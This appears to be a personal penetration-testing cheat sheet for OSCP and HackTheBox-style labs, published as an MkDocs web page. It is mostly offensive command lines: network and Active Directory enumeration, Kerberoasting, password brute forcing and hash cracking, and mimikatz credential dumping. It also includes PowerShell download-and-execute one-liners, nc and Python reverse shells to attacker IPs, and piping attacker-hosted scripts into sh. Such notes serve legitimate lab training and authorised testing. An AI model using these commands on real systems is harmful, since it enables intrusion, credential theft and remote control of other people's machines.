<h2 id="host-discovery">Host Discovery<a class="headerlink" href="#host-discovery" title="Permanent link">&para;</a></h2>
<p>nmap -sn 10.10.1.1-254 -vv -oA hosts 
netdiscover -r 10.10.10.0/24
<div class="highlight"><pre><span></span><code><span class="ch">#!/bin/bash  </span>

<span class="k">for</span><span class="w"> </span>i<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="o">{</span><span class="m">1</span>..256<span class="o">}</span><span class="p">;</span><span class="w"> </span><span class="k">do</span><span class="w"> </span>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="m">10</span>.200.57.<span class="nv">$i</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;bytes from&quot;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39;:&#39;</span><span class="w"> </span>-f<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>cut<span class="w"> </span>-d<span class="s1">&#39; &#39;</span><span class="w"> </span>-f4<span class="w"> </span><span class="p">&amp;</span><span class="w"> </span><span class="k">done</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="nb">wait</span>
</code></pre></div></p>
<h2 id="multi-threaded-python-port-scanner">Multi-threaded Python Port Scanner<a class="headerlink" href="#multi-threaded-python-port-scanner" title="Permanent link">&para;</a></h2>
<p>https://github.com/dievus/threader3000</p>
<h2 id="dns-servervhost-discovery">DNS server/vhost discovery<a class="headerlink" href="#dns-servervhost-discovery" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>nmap -p 53 10.10.10.1-254 -vv -oA dc 
</code></pre></div>
<h2 id="gobuster-ffuf-and-dnsrecon">Gobuster, FFUF and dnsrecon<a class="headerlink" href="#gobuster-ffuf-and-dnsrecon" title="Permanent link">&para;</a></h2>
<p><div class="highlight"><pre><span></span><code>gobuster dns -d cronos.htb -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt 
gobuster vhost -u http://stocker.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain 
//gobuster vhost 
wfuzz -u http://10.10.11.114 -H &quot;Host: FUZZ.bolt.htb&quot; -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt --hh 30341 
//you can do it using wfuzz 
</code></pre></div>
FFUF can be used to discovery subdomains by the use of virtual hosts and changing the Host header <br/>
Try running the below ffuf: <br/>
<div class="highlight"><pre><span></span><code>ffuf -w ~/wordlists/subdomains.txt -H &quot;Host: FUZZ.ffuf.me&quot; -u http://ffuf.me
</code></pre></div>
You'll see from the results that every result comes back with a size of 1495 Bytes.<br/>
Now try running the below ffuf scan but this time using the -fs switch to filter out any results that are 1495 bytes.<br/>
<div class="highlight"><pre><span></span><code>ffuf -w ~/wordlists/subdomains.txt -H &quot;Host: FUZZ.ffuf.me&quot; -u http://ffuf.me -fs 1495
</code></pre></div>
dnsrecon:<br/>
<div class="highlight"><pre><span></span><code>dnsrecon -r 192.168.13.200-192.168.13.254 -n 192.168.13.220   //reverse lookup. dns server is -n
dnsrecon -d acme.local -D /usr/share/golismero/wordlist/dns/dnsrecon.txt -t brt  //bruteforce the acme.local domain for domains and subdomains
dnsrecon -a -d thinc.local -n 192.168.13.220  ## trying zone transfer. -n is the DNS server
dnsenum (for better view and auto everything)
</code></pre></div>
<br/>
Dig Deeper:<br/>
<div class="highlight"><pre><span></span><code>dig axfr cronos.htb @10.10.10.13
</code></pre></div>
retrieve the entire DNS zone data for the "cronos.htb" domain from the DNS server located at the IP address "10.10.10.13".<br/>
(AXFR) DNS protocol operation used to transfer the entire zone data from a primary DNS server to a secondary DNS server.</p>
<h2 id="active-directory-check">Active Directory Check<a class="headerlink" href="#active-directory-check" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="c1">#dig</span>
dig<span class="w"> </span>@10.10.10.52<span class="w"> </span>AXFR<span class="w"> </span>htb.local<span class="w"> </span>
dnsenum<span class="w"> </span><span class="m">10</span>.10.10.52
</code></pre></div>
<h3 id="check-smbrpc">Check smb/rpc<a class="headerlink" href="#check-smbrpc" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1">#smb/rpc</span>
smbclient<span class="w"> </span>-L<span class="w"> </span><span class="m">10</span>.10.10.52<span class="w"> </span>-N<span class="w"> </span>
rpcclient<span class="w"> </span><span class="m">10</span>.10.10.52<span class="w"> </span>-N
smbmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-P<span class="w"> </span><span class="m">445</span><span class="w"> </span>-H<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>smbmap<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;guest&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;&quot;</span><span class="w"> </span>-P<span class="w"> </span><span class="m">445</span><span class="w"> </span>-H<span class="w"> </span>&lt;DC<span class="w"> </span>IP&gt;
smbclient<span class="w"> </span>-N<span class="w"> </span>-L<span class="w"> </span>//192.168.143.225
smbclient<span class="w"> </span>//10.129.143.225/shares<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;ls&#39;</span><span class="w"> </span>-U<span class="w"> </span><span class="s2">&quot;&quot;</span>%<span class="s2">&quot;&quot;</span>
smbclient<span class="w"> </span><span class="s1">&#39;\\10.129.143.225\shares&#39;</span><span class="w"> </span>-U<span class="w"> </span><span class="s1">&#39;guest&#39;</span>%<span class="s1">&#39;&#39;</span><span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;prompt OFF;recurse ON;lcd /home/jacky/hacking/10.129.143.225/smbloot/;mget *&#39;</span>

Maybe<span class="w"> </span>mount<span class="w"> </span>files<span class="w"> </span><span class="k">for</span><span class="w"> </span>better<span class="w"> </span>view
mount<span class="w"> </span>-t<span class="w"> </span>cifs<span class="w"> </span>//10.10.10.192/profiles$<span class="w"> </span>/mnt
</code></pre></div>
<h3 id="check-nmap-scripts">Check nmap scripts<a class="headerlink" href="#check-nmap-scripts" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1">#nmap scripts</span>
nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">139</span>,445<span class="w"> </span>-vv<span class="w"> </span>--script<span class="o">=</span>smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse<span class="w"> </span><span class="m">10</span>.129.77.60

<span class="c1">#Check eternal blue (less possible)</span>

<span class="c1">#enumerate krb users</span>
nmap<span class="w"> </span><span class="m">192</span>.168.x.x<span class="w"> </span>-p<span class="w"> </span><span class="m">88</span><span class="w"> </span>--script<span class="o">=</span>krb5-enum-users<span class="w"> </span>--script-args<span class="w"> </span>krb5-enum-users.realm<span class="o">=</span><span class="s1">&#39;oscp.exam&#39;</span>,userdb<span class="o">=</span>/usr/share/seclists/Usernames/Names/names.txt
</code></pre></div>
<h3 id="check-ldapsearch">Check ldapsearch<a class="headerlink" href="#check-ldapsearch" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code><span class="c1">#ldapsearch</span>
ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://10.10.10.52<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;dc=htb,dc=local&quot;</span>
ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$IP</span><span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=cascade,DC=local&quot;</span><span class="w"> </span>&gt;<span class="w"> </span>full_ldap_dump.txt
ldapsearch<span class="w"> </span>-h<span class="w"> </span><span class="m">10</span>.10.10.182<span class="w"> </span>-x<span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=cascade,DC=local&quot;</span><span class="w"> </span><span class="s1">&#39;(objectClass=person)&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>ldap-people
ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$IP</span><span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>sAMAccountName:
ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$IP</span><span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>namingcontexts
ldapsearch<span class="w"> </span>-x<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$IP</span><span class="w"> </span>-s<span class="w"> </span>base<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>-i<span class="w"> </span>description
ldapsearch<span class="w"> </span>-H<span class="w"> </span>ldap://<span class="nv">$IP</span><span class="w"> </span>-b<span class="w"> </span><span class="s2">&quot;DC=BLACKFIELD,DC=local&quot;</span><span class="w"> </span>-D<span class="w"> </span><span class="s1">&#39;support@blackfield.local&#39;</span><span class="w"> </span>-w<span class="w"> </span><span class="s1">&#39;#00^BlackKnight&#39;</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>lockout

Search<span class="w"> </span>sth<span class="w"> </span>new<span class="w"> </span>and<span class="w"> </span>back<span class="w"> </span>to<span class="w"> </span>dig
</code></pre></div>
<h3 id="check-ldap-with-nmap-and-enum4linux">Check ldap with nmap and enum4linux<a class="headerlink" href="#check-ldap-with-nmap-and-enum4linux" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>nmap<span class="w"> </span>-p<span class="w"> </span><span class="m">389</span><span class="w"> </span>--script<span class="w"> </span>ldap-search<span class="w"> </span><span class="m">10</span>.10.10.161
enum4linux<span class="w"> </span><span class="m">10</span>.10.10.161<span class="w"> </span>&gt;<span class="w"> </span>enum4linux-results.txt
</code></pre></div>
<p>Retrieve domain users who do not have "Do not require Kerberos preauthentication" set and ask for their TGTs without knowing their passwords. <br/>
Obtain a password hash for user accounts that have an SPN (service principal name) as well:<br/>
<div class="highlight"><pre><span></span><code><span class="c1">#GetNPUsers.py</span>
GetNPUsers.py<span class="w"> </span>htb.local/<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.52
impacket-GetNPUsers<span class="w"> </span><span class="s1">&#39;cascade.local/&#39;</span><span class="w"> </span>-usersfile<span class="w"> </span>users.txt<span class="w"> </span>-format<span class="w"> </span>hashcat<span class="w"> </span>-outputfile<span class="w"> </span>hashes.aspreroast<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$IP</span>

<span class="c1">#GetUserSPNs.py</span>
impacket-GetUserSPNs<span class="w"> </span>-request<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">127</span>.0.0.1<span class="w"> </span><span class="s1">&#39;sizzle.htb.local/amanda:Ashare1972&#39;</span><span class="w"> </span>-save<span class="w"> </span>-outputfile<span class="w"> </span>GetUserSPNs.out

proxychains<span class="w"> </span>GetUserSPNs.py<span class="w"> </span>–request<span class="w"> </span>–dc-ip<span class="w"> </span>xx.x.x.xx
oscp.exam/xxxx<span class="w"> </span>–outputfile<span class="w"> </span>/tmp/hashes.kerberoast

imapacket-mssqlclient<span class="w"> </span>oscp.exam/xxx:xxxx@192.168.x.x<span class="w"> </span>–windows-auth
--&gt;<span class="w"> </span>xp_cmdshell

john<span class="w"> </span>–format<span class="o">=</span>krb5tgs<span class="w"> </span>–wordlist<span class="o">=</span>~/rockyou.txt<span class="w"> </span>/tmp/hashes.kerberoast
</code></pre></div></p>
<h3 id="kerbrutecmercecheck-other-common-exploits">Kerbrute/CME/RCE/Check other common exploits<a class="headerlink" href="#kerbrutecmercecheck-other-common-exploits" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>powershell<span class="w"> </span>-c<span class="w"> </span>iex<span class="o">(</span><span class="w"> </span>iwr<span class="w"> </span>http://10.10.14.9/shell.ps1<span class="w"> </span>-UseBasicParsing<span class="w"> </span><span class="o">)</span>
IEX<span class="w"> </span><span class="o">(</span>New-Object<span class="w"> </span>System.Net.Webclient<span class="o">)</span>.DownloadString<span class="o">(</span><span class="s2">&quot;http://MYIP/powercat.ps1&quot;</span><span class="o">)</span><span class="p">;</span>powercat<span class="w"> </span>-c<span class="w"> </span>MYIP<span class="w"> </span>-p<span class="w"> </span><span class="m">4444</span><span class="w"> </span>-e<span class="w"> </span>powershell

<span class="c1">#kerbrute</span>
kerbrute<span class="w"> </span>-domain<span class="w"> </span>htb.local<span class="w"> </span>-users<span class="w"> </span>/usr/share/wordlists/names.txt<span class="w"> </span>-dc-ip<span class="w"> </span><span class="m">10</span>.10.10.52

<span class="c1">#crackmapexec</span>
crackmapexec<span class="w"> </span>smb<span class="w"> </span><span class="m">10</span>.10.10.52<span class="w"> </span>-d<span class="w"> </span>htb.local<span class="w"> </span>-u<span class="w"> </span>htb.local/james<span class="w"> </span>-p<span class="w"> </span>/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt

goldenpac,<span class="w"> </span>zerologon,<span class="w"> </span>printnightmare,<span class="w"> </span>printspoofer,<span class="w"> </span>noPAC,<span class="w"> </span>Password<span class="w"> </span>Hash<span class="w"> </span>Synchronization,<span class="w"> </span>PrivExchange<span class="w"> </span>attack,<span class="w"> </span>Password<span class="w"> </span>Hash<span class="w"> </span>Synchronization<span class="w"> </span><span class="o">(</span>Microsoft<span class="w"> </span>Azure<span class="w"> </span>AD<span class="w"> </span>Sync<span class="o">)</span>**
</code></pre></div>
<h2 id="chiselpivoting">Chisel/Pivoting<a class="headerlink" href="#chiselpivoting" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code><span class="nb">cat </span><span class="p">/</span><span class="n">etc</span><span class="p">/</span><span class="n">proxychains4</span><span class="p">.</span><span class="n">conf</span>

<span class="n">linux</span>
<span class="p">./</span><span class="n">chisellinuxamd</span> <span class="n">server</span> <span class="n">-p</span> <span class="n">8080</span> <span class="p">-</span><span class="n">-reverse</span> <span class="p">&amp;</span>
<span class="p">./</span><span class="n">chisellinuxamd</span> <span class="n">client</span> <span class="n">10</span><span class="p">.</span><span class="n">10</span><span class="p">.</span><span class="n">16</span><span class="p">.</span><span class="n">25</span><span class="p">:</span><span class="n">8080</span> <span class="n">R</span><span class="p">:</span><span class="n">socks</span> <span class="p">&amp;</span>
<span class="nb">ps </span><span class="n">auxww</span> <span class="p">|</span> <span class="n">grep</span> <span class="n">chisel</span>

<span class="n">windows</span>
<span class="nv">$scriptBlock</span> <span class="p">=</span> <span class="p">{</span> <span class="nb">Start-Process</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">chisel</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ArgumentList</span> <span class="p">@(</span><span class="s1">&#39;client&#39;</span><span class="p">,</span><span class="s1">&#39;10.0.0.2:8080&#39;</span><span class="p">,</span><span class="s1">&#39;R:socks&#39;</span><span class="p">)</span> <span class="p">}</span> 
<span class="nb">Start-Job</span> <span class="n">-ScriptBlock</span> <span class="nv">$scriptBlock</span>

<span class="nv">$process</span> <span class="p">=</span> <span class="nb">Get-Process</span> <span class="n">-Name</span> <span class="n">chisel</span> 
<span class="nb">Stop-Process</span> <span class="n">-Id</span> <span class="nv">$process</span><span class="p">.</span><span class="n">Id</span>

<span class="c">#rev shell</span>
<span class="nv">$scriptBlock</span> <span class="p">=</span> <span class="p">{</span> <span class="nb">Start-Process</span> <span class="n">C</span><span class="p">:\</span><span class="n">Windows</span><span class="p">\</span><span class="n">Tasks</span><span class="p">\</span><span class="n">nc</span><span class="p">.</span><span class="n">exe</span> <span class="n">-ArgumentList</span> <span class="p">@(</span><span class="s1">&#39;10.0.0.2&#39;</span><span class="p">,</span><span class="s1">&#39;4444&#39;</span><span class="p">,</span><span class="s1">&#39;-e&#39;</span><span class="p">,</span><span class="s1">&#39;cmd.exe&#39;</span><span class="p">)</span> <span class="p">}</span> 
<span class="nb">Start-Job</span> <span class="n">-ScriptBlock</span> <span class="nv">$scriptBlock</span>
</code></pre></div>
<h2 id="dump-password">Dump password<a class="headerlink" href="#dump-password" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>powershell iwr -uri 10.10.14.14/mimikatz.exe -outfile m.exe
.\m.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; exit
.\m.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;lsadump::lsa /patch&quot; exit
pypykatz lsa minidump lsass.DMP

#one line all
.\mimikatz.exe &quot;privilege::debug&quot; &quot;token::elevate&quot; &quot;sekurlsa::logonpasswords&quot; &quot;lsadump::lsa /inject&quot; &quot;lsadump::sam&quot; &quot;lsadump::cache&quot; &quot;sekurlsa::ekeys&quot; &quot;exit&quot;
</code></pre></div>
<h2 id="evil-winrm">Evil winrm<a class="headerlink" href="#evil-winrm" title="Permanent link">&para;</a></h2>
<div class="highlight"><pre><span></span><code>evil-winrm -i 192.x.x.101 -u administrator -H xxxxxxxx
upload local_filename destination_filename
download remote_filename destination_filename
</code></pre></div>
<h2 id="nse-scripts-scan">NSE Scripts Scan<a class="headerlink" href="#nse-scripts-scan" title="Permanent link">&para;</a></h2>
<p><div class="highlight"><pre><span></span><code>cat script.db | grep &#39;&quot;vuln&quot;\\|&quot;exploit&quot;&#39;
nmap -sV --script=vulscan/vulscan.nse
</code></pre></div>
Port specific NSE script list:
<div class="highlight"><pre><span></span><code>ls /usr/share/nmap/scripts/ssh\*
ls /usr/share/nmap/scripts/smb\*

masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.x -e tun0 &gt; ports
ports=\$(cat ports | awk -F &quot; &quot; &#39;{print \$4}&#39; | awk -F &quot;/&quot; &#39;{print \$1}&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s/,\$//&#39;)
nmap -Pn -sV -sC -p$ports 10.10.10.x
</code></pre></div>
Running specific NSE scripts:
<div class="highlight"><pre><span></span><code>nmap -Pn -sC -sV --script **&quot;http-*&quot;** -p$ports 10.10.10.x -T4 -A
</code></pre></div>
Searchsploit
<div class="highlight"><pre><span></span><code>searchsploit \&lt;name\&gt;
searchsploit \&lt;name\&gt; -w -t  | grep http | cut -f 2 -d &quot;|&quot;
searchsploit -x exploits/php/webapps/47691.sh
for e in \$(searchsploit afd windows -w -t | grep http | cut -f 2 -d &quot;|&quot;);
do exp_name=\$(echo \$e | cut -d &quot;/&quot; -f 5) &amp;&amp; url=$(echo $e | sed &#39;s/exploits/raw/&#39;) &amp;&amp;
wget -q --no-check-certificate $url -O $exp_name; done
</code></pre></div></p>
<p>Database/Website search clues:
<div class="highlight"><pre><span></span><code>find / -name database_settings.inc.php 2&gt;/dev/null
find config/config.inc.php
cat /etc/apache2/sites-enabled/internal.conf 
</code></pre></div></p>
<h2 id="linpeaspspy64">Linpeas/pspy64<a class="headerlink" href="#linpeaspspy64" title="Permanent link">&para;</a></h2>
<p>linpeas: scan linux and exploit
pspy64: check hidden cron jobs 
<div class="highlight"><pre><span></span><code>python -m http.server 5050/80
curl \&lt;kali linux ip address\&gt;:5050/80/linpeas.sh | sh
sudo nc -q 5 -lvnp 80 &lt; linpeas.sh #Host
cat &lt; /dev/tcp/10.10.10.10/80 | sh #Victim
wget http://attackerip/file
curl http://attackerip/file &gt; file
</code></pre></div></p>
<h2 id="burp-suite">Burp Suite<a class="headerlink" href="#burp-suite" title="Permanent link">&para;</a></h2>
<p>Proxy, Intercept is On<br/>
Send to intruder for automation<br/>
Send to Repeater<br/>
Make sure post/get?<br/>
-x/--proxy to localhost:8000 for intercept? (default port burp is 8080)<br/>
<br/>
TCPDUMP<br/>
icmp listener<br/>
tcpdump -ni tun0 icmp<br/>
tcpdump -xvi tun0 -c 10</p>
<h2 id="usb">USB<a class="headerlink" href="#usb" title="Permanent link">&para;</a></h2>
<p>grab a copy of the USB disk:<br/>
<div class="highlight"><pre><span></span><code>sshpass -p raspberry ssh pi@10.10.10.48 &quot;sudo dd if=/dev/sdb | gzip -1 -&quot; | dd of=usb.gz
</code></pre></div>
read all of /dev/sdb and print it to STDOUT<br/>
compress the file read from STDIN (-) and print the result to STDOUT,write that output to usb.gz<br/>
extundelete usb --restore-all</p>
<h2 id="port-knocking">Port Knocking<a class="headerlink" href="#port-knocking" title="Permanent link">&para;</a></h2>
<p>TCP<br/>
knock -v 192.168.0.116 4 27391 159<br/>
<br/>
UDP<br/>
knock -v 192.168.0.116 4 27391 159 -u<br/>
<br/>
TCP &amp; UDP<br/>
knock -v 192.168.1.111 159:udp 27391:tcp 4:udp</p>
<h2 id="brute-force">Brute Force<a class="headerlink" href="#brute-force" title="Permanent link">&para;</a></h2>
<h3 id="johntheripper-and-cewl">Johntheripper and cewl<a class="headerlink" href="#johntheripper-and-cewl" title="Permanent link">&para;</a></h3>
<div class="highlight"><pre><span></span><code>/usr/share/john/ssh2john.py key &gt; hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
gpg2john .keys &gt; gpg.john (PGP keys)

cewl -d 2 -m 5 -w docswords.txt http://10.10.10.10
-d depth
-m minimum word length
-w output file
--lowercase lowercase all parsed words (optional)
</code></pre></div>
<p>// For removing duplications in wordlist<br/>
<div class="highlight"><pre><span></span><code>cat wordlist.txt| sort | uniq &gt; new_word.txt
</code></pre></div></p>
<h3 id="hydra-brute-force">Hydra brute force<a class="headerlink" href="#hydra-brute-force" title="Permanent link">&para;</a></h3>
<p>Find mode if you forget: hashcat --help | grep -i "Kerberos"<br/>
Check type: http-post-form? ssh? etc<br/>
hashcat -m 0 'hash$' /home/kali/Desktop/rockyou.txt // MD5 raw<br/>
hashcat -m 1800 'hash$' /home/kali/Desktop/rockyou.txt // sha512crypt<br/>
hashcat -m 1600 'hash$' /home/kali/Desktop/rockyou.txt // MD5(APR)<br/>
hashcat -m 1500 'hash$' /home/kali/Desktop/rockyou.txt // DES(Unix), Traditional DES, DEScrypt<br/>
hashcat -m 500 'hash$' /home/kali/Desktop/rockyou.txt // MD5crypt, MD5 (Unix)<br/>
hashcat -m 400 'hash$' /home/kali/Desktop/rockyou.txt // Wordpress<br/>
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule<br/>
--potfile-disable to ignore potfile, if hashcat shows HEX[] strings as result, you may need to use --outfile-autohex-disable <br/>
Some login forms use simple base64<br/>
Try this:
<div class="highlight"><pre><span></span><code>hydra<span class="w"> </span>-I<span class="w"> </span>-f<span class="w"> </span>-L<span class="w"> </span>custom-wordlist.txt<span class="w"> </span>-P<span class="w"> </span>custom-wordlist.txt<span class="w"> </span><span class="s1">&#39;http-post-form://192.168.233.61:8081/service/rapture/session:username=^USER64^&amp;password=^PASS64^:C=/:F=403&#39;</span>
</code></pre></div>
-l user -P wordlist <br/>
-t 4<br/>
-V verbose<br/>
-s <br/>
<div class="highlight"><pre><span></span><code>hydra -l user -P /usr/share/wordlists/rockyou.txt 10.129.18.249 http-post-form &quot;/tiny/tinyfilemanager.php:fm_usr=^USER^&amp;fm_pwd=^PASS^:Invalid Username or Password&quot;
</code></pre></div>
Output grepping:
<div class="highlight"><pre><span></span><code>grep &quot;password: &quot; validpasswords.txt | awk &#39;{print $7}&#39; &gt;&gt; passwords.txt
</code></pre></div>
ffuf login brute force:
<div class="highlight"><pre><span></span><code>ffuf -request requests.txt -request-proto http -mode clusterbomb -w passwords.txt:FUZZ -mc 200
</code></pre></div>
Brute Force too long? Try this! <br/>
<div class="highlight"><pre><span></span><code>cewl http://dc-2 -m 5 -w cewl.txt 2&gt;/dev/null
username-anarchy --input-file users.txt --select-format first,flast,first.last,firstl &gt; unames.txt
</code></pre></div></p>
<h2 id="online-tools">Online tools<a class="headerlink" href="#online-tools" title="Permanent link">&para;</a></h2>
<p>https://crackstation.net/ <br/>
LM, NTLM, md2, md4, md5, md5(md5_hex), md5-half, sha1, sha224, sha256, sha384, sha512, ripeMD160, whirlpool, MySQL 4.1+ (sha1(sha1_bin)), QubesV3.1BackupDefaults<br/>
https://www.dcode.fr/tools-list <br/>
MD4, MD5, RC4 Cipher, RSA Cipher, SHA-1, SHA-256, SHA-512, XOR Cipher<br/>
https://www.md5online.org/md5-decrypt.html (MD5)<br/>
https://products.aspose.app/email/viewer/msg (MSG reader)<br/>
https://www.encryptomatic.com/viewer/ (view attachments .eml, .msg, winmail.dat)<br/>
https://github.com/williballenthin/python-evtx (view windows logs .evtx)<br/>
https://github.com/icsharpcode/ILSpy (open-source .NET assembly browser and decompiler)<br/>
https://gchq.github.io/CyberChef/ (Swiss Knife)<br/>
https://tio.run/# (debug)<br/>
Full interactive shell with zsh<br/>
https://blog.mrtnrdl.de/infosec/2019/05/23/obtain-a-full-interactive-shell-with-zsh.html</p>
<h2 id="upgrade-shell">Upgrade shell<a class="headerlink" href="#upgrade-shell" title="Permanent link">&para;</a></h2>
<p><div class="highlight"><pre><span></span><code>ctrl + z
stty -a | head -n1 | cut -d &#39;;&#39; -f 2-3 | cut -b2- | sed &#39;s/; /\n/&#39;
stty raw -echo; fg
stty rows ROWS cols COLS
export TERM=xterm-256color
/usr/bin/python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
</code></pre></div>
<br/>
Can use script to upgrade shell<br/></p>
<p><div class="highlight"><pre><span></span><code>SHELL=/bin/bash script -q /dev/null
</code></pre></div>
<br/>
Python upgrade shell<br/></p>
<div class="highlight"><pre><span></span><code>python -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;
python3 -c &#39;import pty; pty.spawn(&quot;/bin/sh&quot;)&#39;
python3 -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;
/usr/bin/python3 -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;
python -c &#39;import pty;import socket,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;Kali-IP&quot;,443));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(&quot;/bin/bash&quot;)&#39;
</code></pre></div>
<h2 id="flags">Flags<a class="headerlink" href="#flags" title="Permanent link">&para;</a></h2>
<p>Windows:<br/>
<div class="highlight"><pre><span></span><code><span class="n">hostname</span> <span class="p">&amp;&amp;</span> <span class="n">whoami</span><span class="p">.</span><span class="n">exe</span>
<span class="nb">cd </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrator</span>
<span class="nb">type </span><span class="s2">&quot;C:\Users\Administrator\Desktop\proof.txt&quot;</span>
<span class="n">ipconfig</span>

<span class="c">#search flags</span>
<span class="nb">dir </span><span class="p">/</span><span class="n">s</span> <span class="n">proof</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div></p>
<p><div class="highlight"><pre><span></span><code><span class="n">Check</span> <span class="k">for</span> <span class="n">alternative</span> <span class="n">data</span> <span class="n">streams</span><span class="p">:</span>
<span class="nb">dir </span><span class="p">/</span><span class="n">a</span> <span class="p">/</span><span class="nb">r</span>
<span class="n">powershell</span> <span class="n">-c</span> <span class="nb">Get-Content</span> <span class="n">-stream</span> <span class="n">flag</span><span class="p">.</span><span class="n">txt</span> <span class="n">root</span><span class="p">.</span><span class="n">txt</span>
</code></pre></div>
<br/>
Linux:<br/></p>
<div class="highlight"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>/root
hostname<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>whoami<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>cat<span class="w"> </span>/root/proof.txt<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>ip<span class="w"> </span>a
</code></pre></div>












                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    
      
      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
    
    
      <script src="../../assets/javascripts/bundle.92b07e13.min.js"></script>
      
        <script src="../../javascripts/mathjax.js"></script>
      
        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
      
        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
      
